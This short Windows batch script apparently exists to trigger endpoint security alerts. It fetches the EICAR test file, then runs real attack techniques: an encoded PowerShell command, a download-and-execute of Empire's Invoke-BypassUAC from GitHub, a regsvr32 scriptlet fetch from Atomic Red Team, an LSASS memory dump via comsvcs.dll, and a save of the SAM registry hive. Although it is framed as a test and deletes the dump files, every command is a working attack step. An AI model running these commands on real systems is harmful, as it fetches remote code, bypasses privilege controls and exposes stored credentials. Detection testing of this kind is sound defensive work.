CLS

REM ***** THE START *****

REM ***** Eicar Anti Malware Testfile *****
START microsoft-edge:https://secure.eicar.org/eicar.com.txt
START Chrome https://secure.eicar.org/eicar_com.zip

REM ***** Encoded CommandLine *****
POWERSHELL -en RwBlAHQALQBOAGUAdABJAFAAQwBvAG4AZgBpAGcAdQByAGEAdABpAG8AbgA=

REM ***** Process run malicious command *****
POWERSHELL -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/privesc/Invoke-BypassUAC.ps1');Invoke-BypassUAC -Command 'start powershell.exe'"

REM ***** Malicious use of process *****
regsvr32 /s /n /u /i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.010/src/RegSvr32.sct scrobj.dll

REM ***** Attempted credential theft - LSASS Dump *****
POWERSHELL
$ProcessName = "lsass"
$pidnumber = Get-Process -Name $ProcessName | Select -expand ID
rundll32.exe C:\Windows\System32\comsvcs.dll  MiniDump $pidnumber lsass_dump.bin full
EXIT
DEL lsass_dump.bin

REM ***** Attempted credential theft- Registry credentials dump *****
"C:\Windows\System32\REG.exe" save hklm\sam c:\temp\sam1
DEL c:\temp\sam1

REM ***** THE END *****
